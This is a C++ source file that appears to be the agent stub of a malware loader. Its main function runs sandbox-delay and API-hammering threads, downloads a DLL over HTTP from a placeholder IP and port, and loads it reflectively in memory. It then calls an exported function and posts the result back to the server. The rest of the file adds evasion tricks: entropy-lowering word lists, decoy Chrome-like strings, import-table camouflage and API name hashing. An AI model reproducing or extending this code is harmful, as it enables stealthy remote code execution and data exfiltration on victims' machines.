// Agent.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>

#include "../lib/MemoryModule_NoCRT.h"
#include "../lib/NoCRT.h"
#include "../lib/load_dll.h"
#include "../lib/api_hammer.h"

#include "http.h"

// Entropy

const char* words_t[19] = { "transfer","thought","title","turn","then","treat","tragedy","testimony","tissue","typical","trick","thirty","tour","themselves","take","touch","think","tree","theory" };
const char* words_a[14] = { "addition","after","average","acquire","awareness","aircraft","asleep","actress","absolutely","approval","anymore","answer","aids","almost" };
const char* words_b[15] = { "bike","basket","base","bank","black","behind","bombing","block","bird","blade","ball","before","build","buyer","brown" };
const char* words_h[6] = { "hill","hundred","hell","hard","hurt","history" };
const char* words_r[11] = { "requirement","reading","ratio","region","rarely","reaction","rule","recovery","relation","ready","regularly" };
const char* words_p[20] = { "properly","possible","purpose","player","participant","primarily","protest","pray","prompt","previously","potato","peace","public","prosecutor","personally","pleasure","party","production","presidential","parking" };
const char* words_c[16] = { "contest","concept","cotton","command","card","clearly","camp","cable","city","critical","crazy","customer","cake","complain","criteria","current" };
const char* words_d[14] = { "dust","deliver","death","dominant","deeply","decline","dirty","draft","definition","defense","destruction","differ","demonstrate","display" };
const char* words_i[8] = { "ignore","immediate","instance","incredible","intensity","industrial","intention","improvement" };
const char* words_s[16] = { "settle","shower","steel","stretch","storage","street","security","scope","slight","settlement","silent","swing","stranger","score","solution","scientific" };
const char* words_m[8] = { "method","mask","metal","magazine","movie","mess","music","mechanism" };
const char* words_g[5] = { "grow","guide","girlfriend","gently","grandfather" };
const char* words_e[9] = { "event","else","extent","emotion","enemy","explain","express","enterprise","emerge" };
const char* words_w[5] = { "wooden","whom","wipe","would","wonderful" };
const char* words_q[2] = { "question","quarter" };
const char* words_f[9] = { "future","football","fast","financial","fashion","first","fishing","freedom","fiber" };
const char* words_o[4] = { "often","offer","order","onion" };
const char* words_u[4] = { "uniform","unlikely","unknown","unit" };
const char* words_y[3] = { "yellow","yeah","yourself" };
const char* words_k[1] = { "killer" };
const char* words_n[5] = { "news","newly","notice","nothing","north" };
const char* words_l[4] = { "last","late","lift","light" };
const char* words_v[2] = { "violent","visual" };

/*
const char* str_1 = "expand 32-byte k";
const char* str_2 = "unable to deserialize the value.";
const char* str_3 = "fixed-size array has wrong number of elements";
const char* str_4 = "null in array expecting valid pointers";
const char* str_5 = "unknown tag in RunInput";
const char* str_6 = "unknown tag in RunOutput";
const char* str_7 = "unknown tag in RunOrClosePipeInput";
const char* str_8 = "ClientHints RequestValidator";
const char* str_9 = "unknown tag in BigBuffer";
const char* str_10 = "unknown tag in Value";
const char* str_11 = "null in array expecting valid unions";
const char* str_12 = "SIO_ADDRESS_LIST_SORT failed";
const char* str_13 = "DNS config watch failed.";
const char* str_14 = "DNS hosts watch failed.";
const char* str_15 = "DNS registry watch failed to start.";
const char* str_16 = "DNS hosts watch failed to start.";
const char* str_17 = "Failed to read DnsConfig.";
const char* str_18 = "Failed to read DnsHosts.";
const char* str_19 = "Abort parsing of noncompliant DNS record.";
const char* str_20 = "Truncated or missing label pointer.";
const char* str_21 = "Detected loop in label pointers.";
const char* str_22 = "Label pointer points outside packet.";
const char* str_23 = "Name is too long.";
const char* str_24 = "Truncated or missing label.";
const char* str_25 = "Unhandled label type.";
const char* str_26 = "record.rdata should point to record.owned_rdata.";
const char* str_27 = "Invalid RDATA size for a record.";
const char* str_28 = "Invalid dotted name.";
const char* str_29 = "Mismatched answer resource record type and qtype.";
const char* str_30 = "sender: \"DNS over HTTPS\"";
const char* str_31 = "description: \"Domain name resolution over HTTPS\"";
const char* str_32 = "data: \"The domain name that is being requested\"";
const char* str_33 = "destination: OTHER";
const char* str_34 = "cookies_allowed: NO";
const char* str_35 = "\"is disabled by default\"";
const char* str_36 = "Address list empty after RFC3484 sort";
const char* str_37 = "Unsupported RDATA type.";
const char* str_38 = "MDNS bind failed, address_family=";
const char* str_39 = "Start failed, socket=";
const char* str_40 = "Socket error. id=";
const char* str_41 = "MDNS OnConnectionError (code:";
const char* str_42 = "invalid distance too far back";
const char* str_43 = "invalid distance code";
const char* str_44 = "invalid literal/length code";
const char* str_45 = "incorrect header check";
const char* str_46 = "unknown compression method";
const char* str_47 = "invalid window size";
const char* str_48 = "unknown header flags set";
const char* str_49 = "header crc mismatch";
const char* str_50 = "invalid block type";
const char* str_51 = "invalid stored block lengths";
const char* str_52 = "too many length or distance symbols";
const char* str_53 = "invalid code lengths set";
const char* str_54 = "invalid bit length repeat";
const char* str_55 = "invalid code -- missing end-of-block";
const char* str_56 = "invalid literal/lengths set";
const char* str_57 = "invalid distances set";
const char* str_58 = "incorrect data check";
const char* str_59 = "incorrect length check";
const char* str_60 = "application/json; charset=utf-8";
const char* str_61 = ", matches one or more bad hashes:";
const char* str_62 = ". Validated chain:";
const char* str_63 = "Rejecting public key chain for domain";
const char* str_64 = "Failed to serialize HPKP violation report.";
const char* str_65 = "CacheStatsRecorder RequestValidator";
const char* str_66 = "ChromeRenderFrame ResponseValidator";
const char* str_67 = "WebRtcLoggingClient RequestValidator";
const char* str_68 = "NetBenchmarking RequestValidator";
const char* str_69 = "NetworkDiagnostics RequestValidator";
const char* str_70 = "NetworkEasterEgg RequestValidator";
const char* str_71 = "PluginHost RequestValidator";
const char* str_72 = "PluginAuthHost RequestValidator";
const char* str_73 = "PluginInfoHost RequestValidator";
const char* str_74 = "PrerenderCanceler RequestValidator";
const char* str_75 = "ModuleEventSink RequestValidator";
const char* str_76 = "Unknown RequestMode value:";
const char* str_77 = "Unknown FetchResponseType value:";
const char* str_78 = "Unknown Event value:";
const char* str_79 = "Unknown BackgroundFetchFailureReason value:";
const char* str_80 = "Unknown CacheStorageError value:";
const char* str_81 = "Unknown OperationType value:";
const char* str_82 = "Unknown CredentialType value:";
const char* str_83 = "unknown tag in PolicyValueData";
const char* str_84 = "unknown tag in DeviceIdFilter";
const char* str_85 = "unknown tag in UsageFilter";
const char* str_86 = "Unknown MediaStreamType value:";
const char* str_87 = "unknown tag in PermissionDescriptorExtension";
const char* str_88 = "unknown tag in PresentationConnectionMessage";
const char* str_89 = "Unknown PushUnregistrationReason value:";
const char* str_90 = "unknown tag in DataElement";
const char* str_91 = "unknown tag in DrawQuadState";
const char* str_92 = "unknown tag in GpuMemoryBufferPlatformHandle";
const char* str_93 = "unknown tag in VideoBufferHandle";
const char* str_94 = "SafeArchiveAnalyzer ResponseValidator";
const char* str_95 = "Shockwave Flash";
const char* str_96 = "Shockwave Flash";
const char* str_97 = "FutureSplash Player";
const char* str_98 = "Failed to locate a binder for interface \"";
const char* str_99 = "use-zoom-for-dsf enabled by default";
*/
/*
const char* str_100 = "Times New Roman";
const char* str_101 = "ResourceUsageReporter ResponseValidator";
const char* str_102 = "FontCacheWin RequestValidator";
const char* str_103 = "CookieChangeListener RequestValidator";
const char* str_104 = "CookieManager RequestValidator";
const char* str_105 = "CookieManager ResponseValidator";
const char* str_106 = "ResolveHostHandle RequestValidator";
const char* str_107 = "ResolveHostClient RequestValidator";
const char* str_108 = "HostResolver RequestValidator";
const char* str_109 = "HostResolver ResponseValidator";
const char* str_110 = "DnsConfigChangeManagerClient RequestValidator";
const char* str_111 = "DnsConfigChangeManager RequestValidator";
const char* str_112 = "MdnsResponder RequestValidator";
const char* str_113 = "NetLogExporter RequestValidator";
const char* str_114 = "NetLogExporter ResponseValidator";
const char* str_115 = "NetworkChangeManagerClient RequestValidator";
const char* str_116 = "NetworkChangeManager RequestValidator";
const char* str_117 = "CustomProxyConfigClient RequestValidator";
const char* str_118 = "CustomProxyConfigClient ResponseValidator";
const char* str_119 = "TrustedHeaderClient RequestValidator";
const char* str_120 = "TrustedHeaderClient ResponseValidator";
const char* str_121 = "TrustedURLLoaderHeaderClient RequestValidator";
const char* str_122 = "NetworkContextClient RequestValidator";
const char* str_123 = "NetworkContextClient ResponseValidator";
const char* str_124 = "NetworkContext RequestValidator";
const char* str_125 = "NetworkContext ResponseValidator";
const char* str_126 = "NetworkQualityEstimatorManager RequestValidator";
const char* str_127 = "SSLPrivateKey RequestValidator";
const char* str_128 = "SSLPrivateKey ResponseValidator";
const char* str_129 = "AuthChallengeResponder RequestValidator";
const char* str_130 = "ClientCertificateResponder RequestValidator";
const char* str_131 = "NetworkServiceClient RequestValidator";
const char* str_132 = "NetworkServiceClient ResponseValidator";
const char* str_133 = "NetworkService RequestValidator";
const char* str_134 = "NetworkService ResponseValidator";
const char* str_135 = "OriginPolicyManager RequestValidator";
const char* str_136 = "OriginPolicyManager ResponseValidator";
const char* str_137 = "P2PSocketManager RequestValidator";
const char* str_138 = "P2PSocket RequestValidator";
const char* str_139 = "P2PTrustedSocketManagerClient RequestValidator";
const char* str_140 = "P2PTrustedSocketManager RequestValidator";
const char* str_141 = "ProxyConfigClient RequestValidator";
const char* str_142 = "ProxyConfigClient ResponseValidator";
const char* str_143 = "ProxyConfigPollerClient RequestValidator";
const char* str_144 = "ProxyErrorClient RequestValidator";
const char* str_145 = "ProxyLookupClient RequestValidator";
const char* str_146 = "ProxyResolvingSocket RequestValidator";
const char* str_147 = "ProxyResolvingSocket ResponseValidator";
const char* str_148 = "ProxyResolvingSocketFactory RequestValidator";
const char* str_149 = "ProxyResolvingSocketFactory ResponseValidator";
const char* str_150 = "RestrictedCookieManager RequestValidator";
const char* str_151 = "SSLConfigClient RequestValidator";
const char* str_152 = "TCPBoundSocket RequestValidator";
const char* str_153 = "TCPBoundSocket ResponseValidator";
const char* str_154 = "TCPConnectedSocket RequestValidator";
const char* str_155 = "TCPConnectedSocket ResponseValidator";
const char* str_156 = "SocketObserver RequestValidator";
const char* str_157 = "TCPServerSocket RequestValidator";
const char* str_158 = "TCPServerSocket ResponseValidator";
const char* str_159 = "TLSClientSocket RequestValidator";
const char* str_160 = "UDPSocket RequestValidator";
const char* str_161 = "UDPSocket ResponseValidator";
const char* str_162 = "UDPSocketReceiver RequestValidator";
const char* str_163 = "URLLoader RequestValidator";
const char* str_164 = "URLLoaderClient RequestValidator";
const char* str_165 = "URLLoaderClient ResponseValidator";
const char* str_166 = "URLLoaderFactory RequestValidator";
const char* str_167 = "ChunkedDataPipeGetter RequestValidator";
const char* str_168 = "ChunkedDataPipeGetter ResponseValidator";
const char* str_169 = "DataPipeGetter RequestValidator";
const char* str_170 = "DataPipeGetter ResponseValidator";
const char* str_171 = "AuthenticationHandler RequestValidator";
const char* str_172 = "AuthenticationHandler ResponseValidator";
const char* str_173 = "WebSocketHandshakeClient RequestValidator";
const char* str_174 = "WebSocket RequestValidator";
const char* str_175 = "[Invalid CheckArgType]";
const char* str_176 = "# Fatal error in: %s, line %d";
const char* str_177 = "# last system error: %u";
const char* str_178 = "# Check failed: %s";
const char* str_179 = "... (message truncated)";
const char* str_180 = "I@Unknown exception";
const char* str_181 = "Bad optional access";
const char* str_182 = "Couldn't allocate memory in AlignedMalloc";
const char* str_183 = "is not evenly divisible by";
const char* str_184 = "0 != metric->counter";
const char* str_185 = "0 != metric->hicounter";
const char* str_186 = "VolumeCallbacks returned an invalid level=";
const char* str_187 = "[agc] VolumeCallbacks returned an invalid level=";
const char* str_188 = "set_mode(GainControl::kFixedDigital) failed.";
const char* str_189 = "set_target_level_dbfs() failed.";
const char* str_190 = "set_compression_gain_db() failed.";
const char* str_191 = "enable_limiter() failed.";
const char* str_192 = "ProxyResolverRequestClient RequestValidator";
const char* str_193 = "ProxyResolverFactory RequestValidator";
const char* str_194 = "ProxyResolverFactoryRequestClient RequestValidator";
const char* str_195 = "%s(%d): fatal error: \"%s\"";
const char* str_196 = "---- did not expect to get called here";
const char* str_197 = "assert(this->tryAllocPixels(info, rowBytes))";
const char* str_198 = "Mask format not handled.";
const char* str_199 = "Unhandled format.";
const char* str_200 = "Illegal texture sampler index";
const char* str_201 = "Unable to find device for layer.";
const char* str_202 = "void __cdecl SkCanvas::drawPaint(const SkPaint &)";
const char* str_203 = "Runtime Color Filter";
const char* str_204 = "unknown segType";
const char* str_205 = "3assert(length < actualLength)";
const char* str_206 = "unexpected enum";
const char* str_207 = "Unknown mask format.";
const char* str_208 = "Linear Transfer with sRGB Gamut";
const char* str_209 = "2.2 Transfer with sRGB Gamut";
const char* str_210 = "H?sRGB Transfer with DCI-P3 Gamut";
const char* str_211 = "Linear Transfer with DCI-P3 Gamut";
const char* str_212 = "L?sRGB Transfer with Rec-BT-2020 Gamut";
const char* str_213 = "Linear Transfer with Rec-BT-2020 Gamut";
const char* str_214 = "--- SkMatrix::setPolyToPoly count out of range %d";
const char* str_215 = "Unexpected mode";
const char* str_216 = "%s = half4(0, 0, 1, 0);";
const char* str_217 = "float3 normal = normalize(%s.rgb - float3(0.5));";
const char* str_218 = "if (abs(normal.z) > 0.999) {";
const char* str_219 = "float2 transformed = %s * normal.xy;";
const char* str_220 = "assert(2 == count)";
const char* str_221 = "Use of invalid direction change flag";
const char* str_222 = "cannot grow path";
const char* str_223 = "Unexpected origin";
const char* str_224 = "Bad font data serialization line: %d";
const char* str_225 = "Should never be called.";
const char* str_226 = "Don't use this; directly add alphas to the mask.";
const char* str_227 = "SkString: vsnprintf reported error.";
const char* str_228 = "unsupported positioning mode";
const char* str_229 = "GlyphCacheMiss generateMetrics: %s";
const char* str_230 = "GlyphCacheMiss generateImage: %s";
const char* str_231 = "GlyphCacheMiss generatePath: %s";
const char* str_232 = "GlyphCacheMiss generateFontMetrics: %s";
const char* str_233 = "Unknown tile mode.";
const char* str_234 = "half4 diffuseColor = %s;";
const char* str_235 = "float3 normal = %s.xyz;";
const char* str_236 = "half3 result = half3(0.0);";
const char* str_237 = "half NdotL = saturate(half(dot(normal, %s[i])));";
const char* str_238 = "result += half3(%s[i])*diffuseColor.rgb*NdotL;";
const char* str_239 = "result += half3(%s) * diffuseColor.rgb;";
const char* str_240 = "half4 color = %s;";
const char* str_241 = "half nonZeroAlpha = max(color.a, 0.0001);";
const char* str_242 = "color.rgb = color.rgb * color.rgb;";
const char* str_243 = "half luma = dot(color, half4(%f, %f, %f, 0));";
const char* str_244 = "color = half4(luma, luma, luma, 0);";
const char* str_245 = "color = half4(1, 1, 1, 1) - color;";
const char* str_246 = "half fmax = max(color.r, max(color.g, color.b));";
const char* str_247 = "half fmin = min(color.r, min(color.g, color.b));";
const char* str_248 = "half l = (fmax + fmin) / 2;";
const char* str_249 = "half d = fmax - fmin;";
const char* str_250 = "if (color.r >= color.g && color.r >= color.b) {";
const char* str_251 = "h = (color.g - color.b) / d +";
const char* str_252 = "(color.g < color.b ? 6 : 0);";
const char* str_253 = "} else if (color.g >= color.b) {";
const char* str_254 = "h = (color.b - color.r) / d + 2;";
const char* str_255 = "h = (color.r - color.g) / d + 4;";
const char* str_256 = "color = half4(l, l, l, 0);";
const char* str_257 = "half q = l < 0.5 ? l * (1 + s) : l + s - l * s;";
const char* str_258 = "half p = 2 * l - q;";
const char* str_259 = "color.r = %s(p, q, h + 1/3.);";
const char* str_260 = "color.g = %s(p, q, h);";
const char* str_261 = "color.b = %s(p, q, h - 1/3.);";
const char* str_262 = "half m = (1 + %s) / (1 - %s);";
const char* str_263 = "half off = (-0.5 * m + 0.5);";
const char* str_264 = "color = m * color + off;";
const char* str_265 = "color = saturate(color);";
const char* str_266 = "color.rgb = sqrt(color.rgb);";
const char* str_267 = "color.a = %s.a;";
const char* str_268 = "color.rgb *= color.a;";
const char* str_269 = "layout(ctype=SkPMColor) in uniform half4 color0;";
const char* str_270 = "layout(ctype=SkPMColor) in uniform half4 color1;";
const char* str_271 = "layout(ctype=SkPMColor) in uniform half4 color2;";
const char* str_272 = "layout(ctype=SkPMColor) in uniform half4 color3;";
const char* str_273 = "layout(ctype=SkPMColor) in uniform half4 color4;";
const char* str_274 = "layout(ctype=SkPMColor) in uniform half4 color5;";
const char* str_275 = "void main(inout half4 color) {";
const char* str_276 = "half alpha = 255.0 * color.a;";
const char* str_277 = "color = color0;";
const char* str_278 = "} else if (alpha < 1.5) {";
const char* str_279 = "color = color1;";
const char* str_280 = "} else if (alpha < 2.5) {";
const char* str_281 = "color = color2;";
const char* str_282 = "} else if (alpha < 3.5) {";
const char* str_283 = "color = color3;";
const char* str_284 = "} else if (alpha < 4.5) {";
const char* str_285 = "color = color4;";
const char* str_286 = "color = color5;";
const char* str_287 = "half4 coord = half4(%f, %f, %f, %f);";
const char* str_288 = "half nonZeroAlpha = max(%s.a, .0001);";
const char* str_289 = "coord = coord * %f + half4(%f, %f, %f, %f);";
const char* str_290 = "half2(coord.a, 0.125)";
const char* str_291 = "half2(coord.r, 0.375)";
const char* str_292 = "half2(coord.g, 0.625)";
const char* str_293 = "half2(coord.b, 0.875)";
const char* str_294 = "%s.xy = floor(%s);";
const char* str_295 = "%s.zw = %s.xy + half2(1.0);";
const char* str_296 = "half2 %s = fract(%s);";
const char* str_297 = "%s = fract(floor(mod(%s, 256.0)) / half4(256.0));";
const char* str_298 = "half2(%s.x, 0.5)";
const char* str_299 = "half2(%s.z, 0.5)";
const char* str_300 = "half4 %s = fract(%s.xyxy + %s.yyww);";
*/

#define IP ""
#define PORT ""
#define URI_DLL ""
#define URI_RES ""
#define FUNCTION ""

/*
#define IP "IP@@@@@@@@@@@@@@@@@@@@@@@@@"
#define PORT "PORT@@@@@"
#define URI_DLL "URI_DLL@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
#define URI_RES "URI_RES@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
#define FUNCTION "FUNCTION@@@@@@@@@@@@@@@@"
*/

// Generate a random compile-time seed
int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
}


// A dummy function that makes the if-statement in 'IatCamouflage' interesting
PVOID Helper(PVOID* ppAddress) {

    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
    if (!pAddress)
        return NULL;

    // setting the first 4 bytes in pAddress to be equal to a random number (less than 255)
    *(int*)pAddress = RandomCompileTimeSeed() % 0xFF;

    // saving the base address by pointer, and returning it 
    *ppAddress = pAddress;
    return pAddress;
}


// Function that imports WinAPIs but never uses them
/*
VOID IatCamouflage() {

    PVOID		pAddress = NULL;
    int* A = (int*)Helper(&pAddress);

    // Impossible if-statement that will never run
    if (*A > 350) {

        // some random whitelisted WinAPIs
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GetLastError();
        i = SetCriticalSectionSpinCount(NULL, NULL);
        i = GetWindowContextHelpId(NULL);
        i = GetWindowLongPtrW(NULL, NULL);
        i = RegisterClassW(NULL);
        i = IsWindowVisible(NULL);
        i = ConvertDefaultLocale(NULL);
        i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
        i = IsDialogMessageW(NULL, NULL);
    }

    // Freeing the buffer allocated in 'Helper'
    HeapFree(GetProcessHeap(), 0, pAddress);
}
*/

int fib(int n)
{
    if (n <= 1)
        return n;
    return fib(n - 1) + fib(n - 2);
}

/*
void error_test()
{
    SetLastError(10);

    MessageBoxA(NULL, "Error while reading the file", "Warning", 0);
}

void create_file()
{

}

void create_directory()
{
    const char* folderfile = "config";

    CreateDirectory(LPCTSTR(folderfile), NULL);

}
*/

DWORD WINAPI thread_fib(LPVOID lpParam)
{
    char buffer[50];
    int fib_res = fib(45);
    itoa(fib_res, buffer, 10);

    return 0;
}

/*
#define TMPFILE "config.cfg"

BOOL ApiHammering(DWORD dwStress) {

    CHAR     szPath[MAX_PATH * 2],
        szTmpPath[MAX_PATH];
    HANDLE    hRFile = INVALID_HANDLE_VALUE,
        hWFile = INVALID_HANDLE_VALUE;

    DWORD   dwNumberOfBytesRead = NULL,
        dwNumberOfBytesWritten = NULL;

    PUCHAR   pRandBuffer = NULL;
    SIZE_T  sBufferSize = 0xFFFFF;	// 1048575 byte

    INT     Random = 0;

    // Getting the tmp folder path
    if (!GetTempPathA(MAX_PATH, szTmpPath)) {
        //printf("[!] GetTempPathW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    strcpy(szPath, szTmpPath);
    strcat(szPath, TMPFILE);


    for (SIZE_T i = 0; i < dwStress; i++) {

        // Creating the file in write mode
        if ((hWFile = CreateFileA(szPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
            //printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
            return FALSE;
        }

        // Allocating a buffer and filling it with a random value
        pRandBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);

        // Generate the random number
        NTSTATUS status = BCryptGenRandom(
            NULL,                        // Algorithm handle, can be NULL for default RNG
            pRandBuffer, // Buffer to receive the random number
            sBufferSize,        // Size of the buffer
            BCRYPT_USE_SYSTEM_PREFERRED_RNG // Use the system preferred RNG
        );

        // Writing the random data into the file
        if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &dwNumberOfBytesWritten, NULL) || dwNumberOfBytesWritten != sBufferSize) {
            //printf("[!] WriteFile Failed With Error : %d \n", GetLastError());
            //printf("[i] Written %d Bytes of %d \n", dwNumberOfBytesWritten, sBufferSize);
            return FALSE;
        }

        // Clearing the buffer & closing the handle of the file
        RtlZeroMemory(pRandBuffer, sBufferSize);
        CloseHandle(hWFile);

        // Opening the file in read mode & delete when closed
        if ((hRFile = CreateFileA(szPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
            //printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
            return FALSE;
        }

        // Reading the random data written before 	
        if (!ReadFile(hRFile, pRandBuffer, sBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != sBufferSize) {
            //printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
            //printf("[i] Read %d Bytes of %d \n", dwNumberOfBytesRead, sBufferSize);
            return FALSE;
        }

        // Clearing the buffer & freeing it
        RtlZeroMemory(pRandBuffer, sBufferSize);
        HeapFree(GetProcessHeap(), NULL, pRandBuffer);

        // Closing the handle of the file - deleting it
        CloseHandle(hRFile);
    }


    return TRUE;
}
*/

DWORD WINAPI thread_hammer(LPVOID lpParam)
{
    temp_file_creation();

    return 0;
}

/*
int CALLBACK WinMain(
    HINSTANCE   hInstance,
    HINSTANCE   hPrevInstance,
    LPSTR       lpCmdLine,
    int         nCmdShow
)
*/
int main()
{
    /*
    printf2("String hashes:\n");
    printf2("#define KERNEL32_hash 0x%x\n", string_hash("KERNEL32.DLL", SEED));
    printf2("#define USER32_hash 0x%x\n", string_hash("USER32.DLL", SEED));
    printf2("#define NTDLL_hash 0x%x\n", string_hash("NTDLL.DLL", SEED));
    printf2("#define WININET_hash 0x%x\n", string_hash("WININET.DLL", SEED));

    printf2("#define LoadLibraryA_hash 0x%x\n", string_hash("LoadLibraryA", SEED));
    printf2("#define VirtualProtect_hash 0x%x\n", string_hash("VirtualProtect", SEED));
    printf2("#define VirtualAlloc_hash 0x%x\n", string_hash("VirtualAlloc", SEED));
    printf2("#define VirtualFree_hash 0x%x\n", string_hash("VirtualFree", SEED));
    printf2("#define GetProcAddress_hash 0x%x\n", string_hash("GetProcAddress", SEED));
    printf2("#define FreeLibrary_hash 0x%x\n", string_hash("FreeLibrary", SEED));
    printf2("#define GetNativeSystemInfo_hash 0x%x\n", string_hash("GetNativeSystemInfo", SEED));
    printf2("#define HeapAlloc_hash 0x%x\n", string_hash("HeapAlloc", SEED));
    printf2("#define GetProcessHeap_hash 0x%x\n", string_hash("GetProcessHeap", SEED));
    printf2("#define HeapFree_hash 0x%x\n", string_hash("HeapFree", SEED));
    printf2("#define GetThreadLocale_hash 0x%x\n", string_hash("GetThreadLocale", SEED));
    printf2("#define lstrlenA_hash 0x%x\n", string_hash("lstrlenA", SEED));
    printf2("#define IsBadReadPtr_hash 0x%x\n", string_hash("IsBadReadPtr", SEED));

    printf2("#define InternetOpenA_hash 0x%x\n", string_hash("InternetOpenA", SEED));
    printf2("#define InternetConnectA_hash 0x%x\n", string_hash("InternetConnectA", SEED));
    printf2("#define InternetCloseHandle_hash 0x%x\n", string_hash("InternetCloseHandle", SEED));
    printf2("#define HttpOpenRequestA_hash 0x%x\n", string_hash("HttpOpenRequestA", SEED));
    printf2("#define HttpSendRequestA_hash 0x%x\n", string_hash("HttpSendRequestA", SEED));
    printf2("#define InternetReadFile_hash 0x%x\n", string_hash("InternetReadFile", SEED));
    */


    DWORD thread_id;
    HANDLE hThread = CreateThread(
        NULL,                   // default security attributes
        0,                      // use default stack size  
        thread_fib,       // thread function name
        NULL,          // argument to thread function 
        0,                      // use default creation flags 
        &thread_id);   // returns the thread identifier 

    WaitForSingleObject(hThread, INFINITE);

    HANDLE hThread2 = CreateThread(
        NULL,                   // default security attributes
        0,                      // use default stack size  
        thread_hammer,       // thread function name
        NULL,          // argument to thread function 
        0,                      // use default creation flags 
        &thread_id);   // returns the thread identifier 

    WaitForSingleObject(hThread2, INFINITE);

    DWORD thread_res;
    GetExitCodeThread(hThread2, &thread_res);

    if (thread_res != 0)
        return 1;

    MessageBoxA(NULL, "test", "test2", 0);

    HTTP http = HTTP(IP, atoi(PORT), "Test");
    if (http.load_success() == false)
        return 1;

    if (init_memorymodule() == FALSE)
        return 1;

    char* binary;
    size_t binary_size;
    int res = http.get(URI_DLL, &binary, &binary_size);

    if (res == 0)
    {
        //printf("Downloaded %d bytes\n", (int)binary_size);
    }
    else
    {
        //printf("Failed to download: %d\n", res);
        return 1;
    }

    // Load the dll
    HMEMORYMODULE handle = MemoryLoadLibrary(binary, binary_size);
    if (handle == NULL)
    {
        //printf("Failed to load the library\n");
        return 1;
    }

    typedef char* (*func)();
    func f = (func)MemoryGetProcAddress(handle, FUNCTION);
    if (f == NULL)
    {
        //printf("Failed to find the function\n");
        return 2;
    }
    //printf("Execute !\n");

    char* dll_result = f();

    //printf("%s", dll_result);

    //printf("Sending result back\n");

    char* post_response;
    size_t post_response_size;
    res = http.post(URI_RES, dll_result, strlen(dll_result), &post_response, &post_response_size);

    if (res == 0)
    {
        //printf("Successfully sent result back\n");
    }
    else
    {
        //printf("Failed to send result back\n");
        return 2;
    }

    //IatCamouflage();

    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
